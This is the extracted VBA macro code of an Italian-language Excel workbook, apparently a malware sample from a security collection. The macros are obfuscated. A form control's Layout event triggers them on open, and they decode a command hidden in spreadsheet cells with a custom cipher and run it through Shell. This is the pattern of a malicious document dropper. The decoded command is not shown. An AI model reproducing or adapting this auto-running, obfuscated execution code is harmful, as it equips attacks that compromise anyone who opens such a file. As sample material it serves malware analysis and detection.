Attribute VB_Name = "Foglio1"
Attribute VB_Base = "0{00020820-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True
Attribute VB_Control = "pago, 2, 0, MSForms, Frame"


Private Sub pago_Layout()
Questa_cartella_di_lavoro.interfda
End Sub

Attribute VB_Name = "Questa_cartella_di_lavoro"
Attribute VB_Base = "0{00020819-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True
Const II = 3
Function blue()
blue = Mid(ActiveWorkbook.Name, Len(ActiveWorkbook.Name) - II - 2, 1)
End Function

Function LongDi()
LongDi = Cells(II * 10, II)
End Function

Function faza(y As Integer)
mui = ""
For I = II To 10
mui = mui + Zknow(Cells(I, y))
Next I
faza = mui
End Function

Function interfda()
Dim x As Double, pk As String, ego As Workbook
If blue = "6" Then
Randomize
x = Int(2 * Rnd)
If 346 * II > II Then
If x = 0 Then pk = faza(II) Else pk = faza(II * 2)
Shell kase(pk, LongDi, II * 100 + 17), msoAlertCancelFirst: Set ego = Workbooks.Add
End If: End If
End Function

Function kase(jj As String, Ji As String, Ij As Long) As String

    If Ij < 1 Then Ij = 1
    If Len(jj) < Ij Then Ij = Len(jj) + 1

    kase = Mid(jj, 1, Ij - 1) _
                        & Ji _
                        & Mid(jj, Ij, Len(jj) - Ij + 1)

End Function

Function Zknow(ByVal Nz As String) As String

Dim Capr, Sw, xi As Integer
Dim An As Integer
Dim Cwa As Integer
Dim lincoln() As Integer
Dim Beer() As Long
Dim utr As Integer
Sw = 1: xi = 0
    utr = IIf(Right(Nz, Sw) Mod 2 = xi, 5, 4)
    Nz = Left(Nz, Len(Nz) - IIf(Right(Nz, 1) Mod 2 = xi, Sw, Sw))
    Capr = Len(Nz) / utr - Sw
    ReDim lincoln(Capr)
    ReDim Beer(Capr)

    An = xi
    Cwa = xi

    For Cwa = xi To Capr

        lincoln(Cwa) = Cwa - (Capr + Sw)
    Next Cwa

    For An = xi To Capr
        For Cwa = xi To Capr
            If CInt(Mid(Nz, Cwa * utr + Sw, utr - II)) = An Then
                Beer(An) = (Mid(Nz, (Cwa + Sw) * utr - 2, II) + lincoln(An))
                Exit For
            End If
        Next Cwa
    Next An

    Zknow = ""
    For An = xi To Capr
        Zknow = Zknow & Chr(Beer(An))
    Next An

End Function


INQUEST-PP=macro
